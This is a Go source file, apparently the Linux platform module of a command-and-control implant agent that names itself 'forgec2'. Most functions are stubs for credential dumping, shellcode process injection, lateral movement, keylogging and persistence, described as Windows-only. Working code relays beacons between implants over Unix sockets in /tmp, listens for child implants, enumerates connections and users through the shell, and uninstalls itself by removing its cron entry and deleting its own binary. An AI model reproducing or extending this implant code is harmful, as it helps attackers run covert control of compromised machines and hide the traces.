//go:build linux
// +build linux

package main

import (
	"encoding/binary"
	"fmt"
	"image"
	"io"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

// Linux platform stubs. Screenshot / advanced features can be extended later
// (e.g. via X11 or wayland pure-Go, but that adds complexity/deps; start minimal).

func setDPIAware() {
	// noop on Linux
}

func captureScreenRGBA() (*image.RGBA, error) {
	return nil, fmt.Errorf("screenshot not supported on Linux agent yet")
}

// applyHideWindow is a no-op on Linux (only meaningful on Windows)
func applyHideWindow(cmd *exec.Cmd) {
	// nothing
}

// addPersistenceWindows is never called on linux, but provide for interface completeness
func addPersistenceWindows() {}

// Linux persistence stub (already handled in addPersistence via Debug log)
func addPersistenceLinux() {
	if Debug {
		fmt.Printf("[*] Linux persistence stub (crontab/.bashrc/.config/autostart can be added)\n")
	}
}

// getPlatformSecurityInfo returns (integrity level, isElevated, domain) for Linux.
func getPlatformSecurityInfo() (string, bool, string) {
	elevated := os.Geteuid() == 0
	integrity := "Medium"
	if elevated {
		integrity = "High"
	}
	domain, _ := os.Hostname()
	return integrity, elevated, domain
}

func keyloggerLoop() {
	if Debug {
		fmt.Println("[*] Keylogger not supported on Linux agent (requires input device access)")
	}
	// immediately stop so it doesn't hang
	keylogActive = false
}

func suspendProcessWindows(target string) (string, error) {
	return "", fmt.Errorf("suspend only supported on Windows Go agent")
}

func resumeProcessWindows(target string) (string, error) {
	return "", fmt.Errorf("resume only supported on Windows Go agent")
}

func killProcessWindows(target string) (string, error) {
	return "", fmt.Errorf("killproc only supported on Windows Go agent")
}

func clipboardGetWindows() (string, error) {
	return "", fmt.Errorf("clipboard only on Windows")
}

func clipboardSetWindows(data string) error {
	return fmt.Errorf("clipboard only on Windows")
}

func regGetWindows(key string) (string, error) {
	return "", fmt.Errorf("registry only on Windows")
}

func regSetWindows(path, data string) error {
	return fmt.Errorf("registry only on Windows")
}

func regDeleteWindows(key string) error {
	return fmt.Errorf("registry only on Windows")
}

func portScan(target string) (string, error) {
	// reuse common? for linux use nc or timeout
	parts := strings.Split(target, ":")
	if len(parts) != 2 {
		return "", fmt.Errorf("bad format")
	}
	// simplistic
	return "portscan on linux: use nmap or nc", nil
}

// --- Stubs for new high-value features (1,3,4,6) ---

func dumpCreds() (string, error) {
	return "", fmt.Errorf("creds dumping only supported on Windows Go agent (EXE)")
}

func injectProcess(pid uint32, shellcode []byte, tech string) error {
	return fmt.Errorf("process injection only supported on Windows Go agent")
}

func lateralMove(spec string) (string, error) {
	return "", fmt.Errorf("lateral movement only supported on Windows Go agent")
}

func startSocksServer(addr string) {
	// Linux stub: could implement with net.Listen but limited for demo
	go func() {
		ln, err := net.Listen("tcp", addr)
		if err != nil {
			return
		}
		for {
			c, err := ln.Accept()
			if err != nil {
				continue
			}
			c.Close()
		}
	}()
}

func netStat() (string, error) {
	out, _ := runShell("netstat -tunap || ss -tunap", "")
	return out, nil
}

func listUsers() (string, error) {
	out, _ := runShell("who || w", "")
	return out, nil
}

func detectAV() (string, error) {
	return "AV detection on linux limited", nil
}

func uninstallSelf() (string, error) {
	// remove cron etc best effort
	runShell("crontab -l | grep -v forgec2 | crontab -", "")
	exe, _ := os.Executable()
	go func() {
		time.Sleep(1 * time.Second)
		os.Remove(exe)
	}()
	return "linux uninstall attempted", nil
}

func sendP2PSMBBeacon(body []byte) []byte {
	pipeName := strings.TrimPrefix(P2PParent, "pipe://")
	pipePath := fmt.Sprintf("/tmp/%s", pipeName)
	conn, err := net.Dial("unix", pipePath)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P SMB pipe dial to %s failed: %v\n", pipePath, err)
		}
		return nil
	}
	defer conn.Close()

	if err := binary.Write(conn, binary.BigEndian, uint32(len(body))); err != nil {
		return nil
	}
	if _, err := conn.Write(body); err != nil {
		return nil
	}

	var rlen uint32
	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return nil
	}
	if rlen == 0 || rlen > 16*1024*1024 {
		return nil
	}
	rbuf := make([]byte, rlen)
	if _, err := io.ReadFull(conn, rbuf); err != nil {
		return nil
	}
	return rbuf
}

func p2pListenSMB() {
	pipePath := fmt.Sprintf("/tmp/%s", P2PListenAddr)
	os.Remove(pipePath) // clean up stale socket
	ln, err := net.Listen("unix", pipePath)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P SMB listen on %s failed: %v\n", pipePath, err)
		}
		return
	}
	defer ln.Close()
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go p2pHandleChild(conn)
	}
}
